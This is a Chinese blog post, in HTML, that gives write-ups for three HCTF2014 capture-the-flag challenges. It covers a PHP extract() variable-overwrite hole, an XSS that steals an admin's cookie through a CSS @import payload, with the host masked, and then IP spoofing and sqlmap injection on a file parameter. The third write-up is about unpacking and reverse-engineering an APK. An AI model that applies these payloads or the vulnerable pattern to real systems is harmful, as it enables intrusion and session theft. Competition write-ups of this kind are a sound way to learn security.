@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>HCTF2014 部分write up - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="HCTF2014 部分write up - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/31/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>HCTF2014 部分write up</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2014-11-12 19:45"><i class="iconfont icon-date"></i>2014-11-12 19:45</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>1 查看网页源代码提示<code class="highlighter-rouge">index.php.bak</code>，下载下来源代码如下</p>
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$flag</span><span class="o">=</span><span class="s1">'xxx'</span><span class="p">;</span>
+<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$gift</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="nv">$content</span><span class="o">=</span><span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$gift</span><span class="o">==</span><span class="nv">$content</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span><span class="s1">'hctf{...}'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+       <span class="k">echo</span><span class="s1">'Oh..'</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span><span class="cp">?&gt;</span>
+</code></pre>
+</div>
+<p>很明显，这里存在变量覆盖漏洞，构造参数<code class="highlighter-rouge">gift为本文件内容，flag=index.php.bak</code>或者两个参数都留空就可以得到flag。
+关于这个漏洞可以参考 http://zone.wooyun.org/content/1872</p>
+
+<p>2 easy xss
+<img src="http://storage.virusdefender.net/blog/images/31/1.png" alt="2014-11-12 19:22:02 的屏幕截图.png" /></p>
+
+<p>初步构造xss <code class="highlighter-rouge">111@qq.com&lt;script src="**"&gt;&lt;/script&gt;</code> 然后提交的时候提示必须是邮箱地址，F12干掉检测代码，提交上去。
+但是响应是一个alert <code class="highlighter-rouge">提交Email内容为：111@qq.com&lt; ="**"&gt;&lt;/&gt;,管理员会很快登录查看的！</code>这样的话貌似是后台过滤了script和src，调整了一下大小写还是不行，后来就换成了css import的时候的一个xss <code class="highlighter-rouge">@import url("***")</code>后来成功获取到了cookies（其实这一句话还有很多艰辛，原先自己写了一个xss平台，但是现在用一时半会没法部署，找了一个第三方的还什么都收不到，最终还是临时写了一个很简单的)，获取到了cookies之后搜了搜是eyou邮件系统的，但是这个怎么去利用呢？</p>
+
+<p>陷入了僵局，先去看看管理后台是什么样子的吧，直接访问提示ip不允许，把http头修改成了xss获取到的那个ip之后发现后台什么都没有，就是一个页面不断的自动刷新。。。</p>
+
+<p>这时候回到主页上去，发现有一个图片显示的很奇怪，<code class="highlighter-rouge">http://121.41.37.11:25045/img.php?file=1.jpg</code>，一般没有这么用的吧。顺手把<code class="highlighter-rouge">1.jpg</code>换成了<code class="highlighter-rouge">2.jpg</code>，出来了一个命令行的截图，不过不完整，但是这样还是很快就认出来了这就是sqlmap的，原来是这里有注入～～使用sqlmap注入file参数获取到了管理员用户名，还是伪造ip登陆后台获取到了flag。</p>
+
+<p>3 NormalFile</p>
+
+<p>首先使用linux命令<code class="highlighter-rouge">strings</code>查看文件内有没有什么可疑字符串，后来发现出了常规的图片文件信息外貌似还有一些类似文件路径的东西，可能是文件隐写，尝试解压，提示错误，后来在windows上解压才成功的。然后就获取到了一个相同的图片，使用同样的方法，继续解压，得到一个安卓的apk。因为对安卓平台不熟悉，直接<code class="highlighter-rouge">grep -r "flag"</code>发现确实存在这个字符串，但是没有实际的flag，尝试逆向之后获取的java代码是在看不懂了</p>
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="c1">// Decompiled by DJ v3.11.11.95 Copyright 2009 Atanas Neshkov  Date: 2014/11/8 21:49:13</span>
+<span class="c1">// Home Page: http://members.fortunecity.com/neshkov/dj.html  http://www.neshkov.com/dj.html - Check often for new version!</span>
+<span class="c1">// Decompiler options: packimports(3)</span>
+
+<span class="kn">package</span> <span class="n">cc</span><span class="o">.</span><span class="na">hctf</span><span class="o">.</span><span class="na">babytrick</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">android.os.Bundle</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.os.Environment</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.support.v7.a.f</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.view.Menu</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.view.MenuItem</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.widget.Button</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">android.widget.Toast</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+
+<span class="c1">// Referenced classes of package cc.hctf.babytrick:</span>
+<span class="c1">//            a</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="kd">extends</span> <span class="n">f</span>
+<span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">Main</span><span class="o">()</span>
+    <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">a</span><span class="o">(</span><span class="n">Main</span> <span class="n">main</span><span class="o">,</span> <span class="n">String</span> <span class="n">s</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="n">main</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">b</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="n">String</span> <span class="n">s1</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="n">Environment</span><span class="o">.</span><span class="na">getExternalStorageDirectory</span><span class="o">().</span><span class="na">getPath</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"/brand.txt"</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
+        <span class="k">try</span>
+        <span class="o">{</span>
+            <span class="n">FileInputStream</span> <span class="n">fileinputstream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">s1</span><span class="o">));</span>
+            <span class="n">BufferedReader</span> <span class="n">bufferedreader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">fileinputstream</span><span class="o">));</span>
+            <span class="n">s</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">bufferedreader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()).</span><span class="na">toString</span><span class="o">();</span>
+            <span class="n">bufferedreader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">fileinputstream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">catch</span><span class="o">(</span><span class="n">FileNotFoundException</span> <span class="n">filenotfoundexception</span><span class="o">)</span>
+        <span class="o">{</span>
+            <span class="n">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="s">"I'm sorry to hear that you never try my favorite brand :("</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">ioexception</span><span class="o">)</span>
+        <span class="o">{</span>
+            <span class="n">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="s">"Oh... Why don't you try that? :("</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="kt">char</span> <span class="n">ac</span><span class="o">[];</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">s</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">==</span> <span class="mi">16</span><span class="o">)</span>
+            <span class="k">if</span><span class="o">((</span><span class="n">ac</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">())[</span><span class="mi">15</span><span class="o">]</span> <span class="o">==</span> <span class="n">ac</span><span class="o">[</span><span class="mi">13</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">ac</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span> <span class="o">==</span> <span class="n">ac</span><span class="o">[</span><span class="mi">9</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">ac</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span> <span class="o">==</span> <span class="n">ac</span><span class="o">[</span><span class="mi">8</span><span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="n">ac</span><span class="o">[</span><span class="mi">7</span><span class="o">]</span> <span class="o">==</span> <span class="n">ac</span><span class="o">[</span><span class="mi">10</span><span class="o">])</span>
+            <span class="o">{</span>
+                <span class="n">String</span> <span class="n">s2</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">""</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">4</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">8</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">12</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="s">"++"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">13</span><span class="o">)).</span><span class="na">toString</span><span class="o">();</span>
+                <span class="kt">int</span> <span class="n">ai</span><span class="o">[]</span> <span class="o">=</span> <span class="o">{</span>
+                    <span class="mi">112</span><span class="o">,</span> <span class="mi">83</span><span class="o">,</span> <span class="mi">93</span><span class="o">,</span> <span class="mi">112</span><span class="o">,</span> <span class="mi">28</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">87</span><span class="o">,</span> <span class="mi">91</span>
+                <span class="o">};</span>
+                <span class="kt">char</span> <span class="n">ac1</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="o">[</span><span class="mi">8</span><span class="o">];</span>
+                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span>
+                    <span class="n">ac1</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">s2</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">()[</span><span class="n">i</span><span class="o">]</span> <span class="o">^</span> <span class="n">ai</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
+
+                <span class="k">if</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">""</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">6</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">10</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">14</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">3</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="sc">'+'</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">11</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="sc">'+'</span><span class="o">).</span><span class="na">toString</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">ac1</span><span class="o">)))</span>
+                <span class="o">{</span>
+                    <span class="n">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">":) I'm happy to see your favorite toast is just the same as me:hctf{"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="sc">'}'</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">bundle</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">bundle</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="mh">0x7f030018</span><span class="o">);</span>
+        <span class="n">Button</span> <span class="n">button</span> <span class="o">=</span> <span class="o">(</span><span class="n">Button</span><span class="o">)</span><span class="n">findViewById</span><span class="o">(</span><span class="mh">0x7f07003d</span><span class="o">);</span>
+        <span class="n">button</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">a</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">button</span><span class="o">));</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onCreateOptionsMenu</span><span class="o">(</span><span class="n">Menu</span> <span class="n">menu</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onOptionsItemSelected</span><span class="o">(</span><span class="n">MenuItem</span> <span class="n">menuitem</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">menuitem</span><span class="o">.</span><span class="na">getItemId</span><span class="o">()</span> <span class="o">==</span> <span class="mh">0x7f070040</span><span class="o">)</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="k">else</span>
+            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">onOptionsItemSelected</span><span class="o">(</span><span class="n">menuitem</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre>
+</div>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=HCTF2014 部分write up&article_id=/index.php/archives/31/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
